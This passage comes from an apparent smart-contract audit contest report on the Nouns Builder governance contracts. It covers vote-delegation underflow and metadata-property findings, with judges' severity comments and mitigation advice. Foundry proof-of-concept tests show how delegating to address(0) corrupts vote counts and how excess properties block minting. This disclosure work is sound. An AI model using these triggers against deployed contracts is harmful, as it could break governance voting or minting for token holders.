class=\"mtk1\">(</span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>When <code>_to</code> isn’t zero there always be an addition in _moveDelegateVotes(), so the system votes balance will be sustained.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478#issuecomment-1257279353\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>From <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L197-L198\"><code>Auction</code></a> we know that token Burning will happen only on failure to complete the auction.</p>\n<p>While a new mechanism for burning could be added, it would require changing the code via an upgrade (conditional).</p>\n<p>The Warden has proven how underflow will cause the inability to transfer the token permanently and irreversibly.</p>\n<p>Delegating to 0, will cause Delegation to no longer be available (see other reports), however this finding also shows how Delegating to Address(0) causes the token to no longer being transferable.</p>\n<p>I think the submission is well developed, however it requires the owner to delegate to the address(0).</p>\n<p>For that reason, I think the finding is of Medium Severity.</p>\n<p>Because this is the only report that shows loss of Token, am not going to bulk with the others which instead show how Voting Power is lost irreversibly.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478#issuecomment-1258617084\">iainnash (Nouns Builder) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Logical duplicate of <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478\">#478</a> but agree with @Alex the Entreprenerd about the reference being to lost token(s) being valid.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-delegation-should-not-be-allowed-to-address0\" style=\"position:relative;\"><a href=\"#m-08-delegation-should-not-be-allowed-to-address0\" aria-label=\"m 08 delegation should not be allowed to address0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203\">[M-08] Delegation should not be allowed to address(0)</a></h2>\n<p><em>Submitted by davidbrai, also found by bin2chen, Ch_301, Chom, cryptphi, pashov, and PwnPatrol</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol#L179-L190\">ERC721Votes.sol#L179-L190</a><br></p>\n<p>Assuming an existing bug in the <code>_delegate</code> function is fixed (see my previous issue submission titled ”<a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/198\">Delegating votes leaves the token owner with votes while giving the delegate additional votes</a>”):<br>\nif a user delegates to address(0) that vote gets lost.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Assuming the <code>_delegate</code> function gets patched by changing:<br>\n<code>address prevDelegate = delegation[_from];</code><br>\nto<br>\n<code>address prevDelegate = delegates(_from);</code></p>\n<p>The steps to be taken:</p>\n<ol>\n<li>User (U) gets one NFT (e.g by winning the auction)\na. votes(U) = 1</li>\n<li>U delegates to address(0) // prevDelegate is U, so votes(U)—\na. votes(U) = 0, votes(address(0)) = 0</li>\n<li>U delegates to address(0) // prevDelegate is U, so votes(U)—\na. votes(U) = 2^192 - 1</li>\n</ol>\n<p>Below is a forge test showing the issue:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.15;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { NounsBuilderTest } from &quot;../utils/NounsBuilderTest.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { TokenTypesV1 } from &quot;../../src/token/types/TokenTypesV1.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract TokenTest is NounsBuilderTest, TokenTypesV1 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address user1 = address(0x1001);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address delegate1 = address(0x2001);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address delegate2 = address(0x2002);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setUp() public virtual override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super.setUp();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.label(user1, &quot;user1&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.label(delegate1, &quot;delegate1&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deployMock();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setMockFounderParams() internal virtual override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] memory wallets = new address[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory percents = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[] memory vestingEnds = new uint256[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        wallets[0] = founder;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        percents[0] = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vestingEnds[0] = 4 weeks;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        setFounderParams(wallets, percents, vestingEnds);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function test_pown2() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // user1 gets one token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(address(auction));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.mint();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.transferFrom(address(auction), user1, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // user1 has 1 token &amp; 1 vote</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.balanceOf(user1), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.getVotes(user1), 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(user1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.delegate(address(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.getVotes(user1), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(user1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.delegate(address(0));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(token.getVotes(user1), type(uint192).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Either:</p>\n<ol>\n<li>Don’t allow delegation to address(0) by adding a check<br>\nor<br></li>\n<li>If someone tries to delegate to address(0), delegate to the NFT owner instead</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203#issuecomment-1257280046\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to incorrect accounting, the delegation of voting power to the address(0) will permanently burn that voting power.</p>\n<p>Because this is contingent on the owner performing the delegation, I believe Medium Severity to be more appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/203\">tbtstl (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-09-index-out-of-bounds-error-when-properties-length-is-more-than-attributes-length-breaks-minting\" style=\"position:relative;\"><a href=\"#m-09-index-out-of-bounds-error-when-properties-length-is-more-than-attributes-length-breaks-minting\" aria-label=\"m 09 index out of bounds error when properties length is more than attributes length breaks minting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/523\">[M-09] Index out of bounds error when properties length is more than attributes length breaks minting</a></h2>\n<p><em>Submitted by dipp, also found by 0x1f8b, 0x52, 0xc0ffEE, 0xSky, bin2chen, datapunk, eierina, elad, hansfriese, hyh, izhuer, Jeiwan, Migue, R2, and scaraven</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol#L188-L198\">MetadataRenderer.sol#L188-L198</a><br></p>\n<p>When a token is minted, the <code>MetadataRenderer.sol</code> <code>onMinted</code> function is called which will set the particular token’s attributes to a random item from one of the properties. A token has a maximum of 16 attributes, the first one being the total number of properties. The properties from which the token receives its attributes are supplied by the owner of the <code>MetadataRenderer.sol</code> contract by calling <code>addProperties</code>. The issue is that the number of properties the owner can supply is not limited. If the number of properties is more than 15 then the <code>onMinted</code> function will revert due to the limit on the number of attributes a token may have.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Since <code>onMinted</code> is always called when tokens are minted, the DAO will not be able to mint new tokens. There does not seem to be a way to remove properties so this would be unrecoverable.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Test code added to <code>Token.t.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_MetadataProperties</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">createUsers</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wallets</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">percents</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vestExpirys</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pct</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">50</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">end</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">2</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">wallets</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">otherUsers</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">pct</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">vestExpirys</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">end</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deployWithCustomFounders</span><span class=\"mtk1\">(</span><span class=\"mtk12\">wallets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">percents</span><span class=\"mtk1\">, </span><span class=\"mtk12\">vestExpirys</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Check deployed correctly</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalFounders</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalFounderOwnership</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">100</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Create 16 properties and items</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">names</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">string</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ItemParam</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">items</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk10\">ItemParam</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">16</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">16</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">names</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">] = </span><span class=\"mtk8\">&quot;aaa&quot;</span><span class=\"mtk1\">;                                                                               </span><span class=\"mtk3\">// Add random properties</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">items</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">].</span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;aaa&quot;</span><span class=\"mtk1\">;                                                                          </span><span class=\"mtk3\">// Add random items</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">items</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">].</span><span class=\"mtk12\">propertyId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint16</span><span class=\"mtk1\">(</span><span class=\"mtk12\">j</span><span class=\"mtk1\">);                                                                </span><span class=\"mtk3\">// Make sure all properties have items</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">items</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">].</span><span class=\"mtk12\">isNewProperty</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">IPFSGroup</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">group</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">MetadataRendererTypesV1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">IPFSGroup</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;aaa&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;aaa&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );                                                                                                  </span><span class=\"mtk3\">// Add random IPFS group</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Add 16 properties</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">otherUsers</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">metadataRenderer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addProperties</span><span class=\"mtk1\">(</span><span class=\"mtk12\">names</span><span class=\"mtk1\">, </span><span class=\"mtk12\">items</span><span class=\"mtk1\">, </span><span class=\"mtk12\">group</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Attempt to mint</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stdError</span><span class=\"mtk1\">.</span><span class=\"mtk12\">indexOOBError</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The test code above shows that the owner of <code>MetadataRenderer.sol</code> is able to add 16 properties with 1 items each. The <code>auction</code> contract is then unable to mint due to an “Index out of bounds” error.</p>\n<p>Code from the <code>onMinted</code> function in <code>MetadataRenderer.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// For each property:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numProperties</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span 